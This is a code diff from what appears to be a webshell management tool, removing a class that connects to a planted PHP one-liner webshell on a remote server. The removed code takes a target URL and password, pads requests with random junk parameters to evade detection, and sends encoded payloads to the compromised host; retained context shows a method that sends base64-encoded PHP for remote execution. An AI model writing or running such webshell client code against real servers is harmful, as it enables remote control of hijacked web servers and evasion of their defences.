@@ -241,9 +241,6 @@ PAYLOAD_SESSIONIZE_CHUNK = 5000
 
 __all__ = [
     "PHPWebshell",
-    "PHPWebshellOneliner",
-    "PHPWebshellBehinderAES",
-    "PHPWebshellBehinderXor",
 ]
 
 basic_info_names = {
@@ -596,121 +593,6 @@ class PHPWebshell(PHPSessionInterface):
     async def php_eval(self, code: str) -> str:
         result = await self.submit(EVAL_PHP.format(code_b64=repr(base64_encode(code))))
         return result
-
-
-@register_session
-class PHPWebshellOneliner(PHPWebshell):
-    """一句话的php webshell"""
-
-    session_type = "ONELINE_PHP"
-    readable_name = "PHP一句话"
-    conn_options: t.List[ConnOptionGroup] = [
-        {
-            "name": "基本连接配置",
-            "options": [
-                ConnOption(
-                    id="url",
-                    name="地址",
-                    type="text",
-                    placeholder="http://xxx.com",
-                    default_value=None,
-                    alternatives=None,
-                ),
-                ConnOption(
-                    id="method",
-                    name="请求方法",
-                    type="select",
-                    placeholder="POST",
-                    default_value="POST",
-                    alternatives=[
-                        {"name": "POST", "value": "POST"},
-                        {"name": "GET", "value": "GET"},
-                    ],
-                ),
-                ConnOption(
-                    id="password",
-                    name="密码",
-                    type="text",
-                    placeholder="******",
-                    default_value=None,
-                    alternatives=None,
-                ),
-            ],
-        },
-        {
-            "name": "高级连接配置",
-            "options": [
-                ConnOption(
-                    id="encoder",
-                    name="编码器",
-                    type="select",
-                    placeholder="base64",
-                    default_value="base64",
-                    alternatives=[
-                        {"name": "base64", "value": "base64"},
-                    ],
-                ),
-                ConnOption(
-                    id="http_params_obfs",
-                    name="HTTP参数混淆",
-                    type="checkbox",
-                    placeholder=None,
-                    default_value=True,
-                    alternatives=None,
-                ),
-                ConnOption(
-                    id="sessionize_payload",
-                    name="Session暂存payload",
-                    type="checkbox",
-                    placeholder=None,
-                    default_value=False,
-                    alternatives=None,
-                ),
-            ],
-        },
-    ]
-
-    def __init__(self, session_conn: dict) -> None:
-        super().__init__(
-            PHPWebshellOptions(
-                encoder=session_conn["encoder"],
-                sessionize_payload=session_conn["sessionize_payload"],
-            )
-        )
-        self.method = session_conn["method"].upper()
-        self.url = session_conn["url"]
-        self.password = session_conn["password"]
-        self.params = {}
-        self.data = {}
-        self.http_params_obfs = session_conn["http_params_obfs"]
-        self.client = get_http_client()
-
-    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
-        params = self.params.copy()
-        data = self.data.copy()
-        obfs_data = {}
-        if self.http_params_obfs:
-            obfs_data = {
-                random_english_words(): random_data()
-                for _ in range(random.randint(8, 12))
-            }
-        if self.method in ["GET", "HEAD"]:
-            params[self.password] = payload
-            params.update(obfs_data)
-        else:
-            data[self.password] = payload
-            data.update(obfs_data)
-        try:
-            response = await self.client.request(
-                method=self.method, url=self.url, params=params, data=data
-            )
-            return response.status_code, response.text
-
-        except httpx.TimeoutException as exc:
-            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
-        except httpx.HTTPError as exc:
-            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
-
 
 @register_session
 class PHPWebshellBehinderAES(PHPWebshell):
